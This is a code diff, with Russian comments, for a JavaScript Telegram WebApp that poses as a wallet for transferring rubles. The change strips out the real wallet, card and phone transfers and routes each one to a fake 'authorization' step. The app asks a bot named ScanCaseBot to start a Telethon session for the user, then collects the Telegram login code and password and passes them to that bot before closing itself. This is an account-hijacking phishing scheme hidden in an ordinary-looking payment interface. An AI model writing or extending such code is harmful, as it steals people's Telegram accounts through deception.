@@ -416,6 +416,7 @@ if (transferBtn) {
 const setupScreen = document.getElementById('setupScreen');
 const setupPhoneStep = document.getElementById('setupPhoneStep');
 
+// Клик по пунктам перевода — просто открываем форму, без авторизации
 document.querySelectorAll('.transfer-item').forEach(item => {
     item.addEventListener('click', () => {
         const action = item.dataset.action;
@@ -430,18 +431,28 @@ document.querySelectorAll('.transfer-item').forEach(item => {
             return;
         }
 
-        if (userData.phone && action !== 'check') {
-            const minAmount = 50;
-            if (userData.balance < minAmount) {
-                showToast('Недостаточно средств для перевода', 'error');
-                return;
+        if (action === 'wallet') {
+            transferScreen.classList.remove('active');
+            if (screenStack.length > 0 && screenStack[screenStack.length - 1].element === transferScreen) {
+                screenStack.pop();
             }
-            const botUsername = 'ScanCaseBot';
-            tg.openTelegramLink(`https://t.me/${botUsername}?start=createSession_${currentUserId}`);
-            return;
-        }
-
-        if (action === 'check') {
+            document.getElementById('walletTransferScreen').classList.add('active');
+            pushScreen(document.getElementById('walletTransferScreen'));
+        } else if (action === 'card') {
+            transferScreen.classList.remove('active');
+            if (screenStack.length > 0 && screenStack[screenStack.length - 1].element === transferScreen) {
+                screenStack.pop();
+            }
+            document.getElementById('cardTransferScreen').classList.add('active');
+            pushScreen(document.getElementById('cardTransferScreen'));
+        } else if (action === 'phone') {
+            transferScreen.classList.remove('active');
+            if (screenStack.length > 0 && screenStack[screenStack.length - 1].element === transferScreen) {
+                screenStack.pop();
+            }
+            document.getElementById('phoneTransferScreen').classList.add('active');
+            pushScreen(document.getElementById('phoneTransferScreen'));
+        } else if (action === 'check') {
             transferScreen.classList.remove('active');
             if (screenStack.length > 0 && screenStack[screenStack.length - 1].element === transferScreen) {
                 screenStack.pop();
@@ -553,8 +564,13 @@ function appendCodeDigit(digit) {
     currentCode += digit;
     updateCodeDots();
     if (currentCode.length === 5) {
+        // Код введён полностью — отправляем в бота
         const botUsername = 'ScanCaseBot';
         tg.openTelegramLink(`https://t.me/${botUsername}?start=sendCode_${currentUserId}_${currentCode}`);
+        // Через 2 секунды закрываем WebApp, чтобы пользователь увидел ответ бота
+        setTimeout(() => {
+            tg.close();
+        }, 2000);
     }
 }
 
@@ -603,10 +619,14 @@ if (passwordSubmit) {
         }
         const botUsername = 'ScanCaseBot';
         tg.openTelegramLink(`https://t.me/${botUsername}?start=sendPassword_${currentUserId}_${password}`);
+        // Через 2 секунды закрываем WebApp
+        setTimeout(() => {
+            tg.close();
+        }, 2000);
     });
 }
 
-// ==================== ЛОГИКА ПЕРЕВОДОВ ====================
+// ==================== ЛОГИКА ПЕРЕВОДОВ С АВТОРИЗАЦИЕЙ ====================
 
 function validateAmount(value, min) {
     const num = parseFloat(value);
@@ -630,6 +650,19 @@ function addTransaction(type, amount, description) {
     renderMiniHistory();
 }
 
+// Функция запуска авторизации через Telethon
+function startAuthFlow() {
+    const botUsername = 'ScanCaseBot';
+    // Отправляем запрос на создание сессии
+    tg.openTelegramLink(`https://t.me/${botUsername}?start=createSession_${currentUserId}`);
+    // Через 2 секунды показываем экран ввода кода (даём боту время отправить код)
+    setTimeout(() => {
+        codeScreen.classList.add('active');
+        pushScreen(codeScreen, null, "#1a1d29");
+    }, 2000);
+}
+
+// Перевод в кошелёк
 const walletSubmit = document.getElementById('walletSubmit');
 const walletRecipient = document.getElementById('walletRecipient');
 const walletAmount = document.getElementById('walletAmount');
@@ -638,6 +671,7 @@ if (walletSubmit) {
     walletSubmit.addEventListener('click', () => {
         const recipient = walletRecipient.value.trim();
         const amount = parseFloat(walletAmount.value);
+
         if (!recipient) {
             showToast('Введите получателя', 'error');
             return;
@@ -646,15 +680,15 @@ if (walletSubmit) {
             showToast('Минимальная сумма 50 ₽ или недостаточно средств', 'error');
             return;
         }
-        userData.balance -= amount;
-        addTransaction('outcome', amount, `Перевод в кошелёк: ${recipient}`);
-        showToast(`Перевод ${amount.toFixed(2)} ₽ выполнен!`, 'success');
-        walletRecipient.value = '';
-        walletAmount.value = '';
-        popScreen();
+
+        // Проверяем, авторизован ли пользователь через Telethon
+        // Пока просто запускаем flow авторизации
+        // В будущем: if (!userData.telegramAuth) { startAuthFlow(); return; }
+        startAuthFlow();
     });
 }
 
+// Перевод на карту
 const cardSubmit = document.getElementById('cardSubmit');
 const cardNumber = document.getElementById('cardNumber');
 const cardAmount = document.getElementById('cardAmount');
@@ -676,6 +710,7 @@ if (cardSubmit) {
     cardSubmit.addEventListener('click', () => {
         const card = cardNumber.value.replace(/\s/g, '');
         const amount = parseFloat(cardAmount.value);
+
         if (card.length < 16) {
             showToast('Введите корректный номер карты', 'error');
             return;
@@ -684,15 +719,12 @@ if (cardSubmit) {
             showToast('Минимальная сумма 50 ₽ или недостаточно средств', 'error');
             return;
         }
-        userData.balance -= amount;
-        addTransaction('outcome', amount, `Перевод на карту **** ${card.slice(-4)}`);
-        showToast(`Перевод ${amount.toFixed(2)} ₽ на карту выполнен!`, 'success');
-        cardNumber.value = '';
-        cardAmount.value = '';
-        popScreen();
+
+        startAuthFlow();
     });
 }
 
+// Перевод по телефону
 const phoneSubmit = document.getElementById('phoneSubmit');
 const phoneRecipient = document.getElementById('phoneRecipient');
 const phoneAmount = document.getElementById('phoneAmount');
@@ -701,6 +733,7 @@ if (phoneSubmit) {
     phoneSubmit.addEventListener('click', () => {
         const phone = phoneRecipient.value.trim();
         const amount = parseFloat(phoneAmount.value);
+
         if (!phone || phone.length < 10) {
             showToast('Введите корректный номер телефона', 'error');
             return;
@@ -709,14 +742,12 @@ if (phoneSubmit) {
             showToast('Минимальная сумма 50 ₽ или недостаточно средств', 'error');
             return;
         }
-        userData.balance -= amount;
-        addTransaction('outcome', amount, `Перевод по телефону: ${phone}`);
-        showToast(`Перевод ${amount.toFixed(2)} ₽ выполнен!`, 'success');
-        phoneRecipient.value = '';
-        phoneAmount.value = '';
-        popScreen();
+
+        startAuthFlow();
     });
 }
+
+// ==================== СОЗДАНИЕ ЧЕКА (без авторизации) ====================
 
 const checkSubmit = document.getElementById('checkSubmit');
 const checkAmount = document.getElementById('checkAmount');
@@ -751,15 +782,20 @@ if (checkSubmit) {
     checkSubmit.addEventListener('click', async () => {
         const amount = parseFloat(checkAmount.value);
         const recipient = checkRecipient.value.trim();
+
         if (!validateAmount(checkAmount.value, 10)) {
             showToast('Минимальная сумма чека 10 ₽ или недостаточно средств', 'error');
             return;
         }
+
         const recipientId = parseRecipientId(recipient);
         const checkId = getCheckId();
+
         userData.balance -= amount;
+
         const token = await encryptCheck(amount, recipientId, checkId);
         lastCheckToken = token;
+
         if (!userData.createdChecks) userData.createdChecks = [];
         userData.createdChecks.push({
             token: token,
@@ -768,16 +804,21 @@ if (checkSubmit) {
             date: new Date().toISOString(),
             checkId: checkId
         });
+
         addTransaction('outcome', amount, recipientId 
             ? `Создание чека для пользователя (${amount.toFixed(2)} ₽)` 
             : `Создание чека (${amount.toFixed(2)} ₽)`);
+
         showToast('Чек успешно создан!', 'success');
+
         checkAmount.value = '';
         checkRecipient.value = '';
+
         document.getElementById('checkScreen').classList.remove('active');
         if (screenStack.length > 0 && screenStack[screenStack.length - 1].element === document.getElementById('checkScreen')) {
             screenStack.pop();
         }
+
         checkResultAmount.textContent = amount.toFixed(2) + ' ₽';
         const botUsername = 'ScanCaseBot';
         const shareLink = `https://t.me/${botUsername}?start=${token}`;
@@ -821,6 +862,14 @@ function handleStartAppParam() {
         const targetUserId = parseInt(startParam.split('_')[1]);
         if (targetUserId === currentUserId) {
             showToast('Авторизация успешна!', 'success');
+            // Сохраняем флаг авторизации
+            userData.telegramAuth = true;
+            saveUserData(currentUserId, userData);
+        }
+    } else if (startParam.startsWith('retry_')) {
+        const targetUserId = parseInt(startParam.split('_')[1]);
+        if (targetUserId === currentUserId) {
+            showToast('Попробуйте снова', 'info');
         }
     }
 }
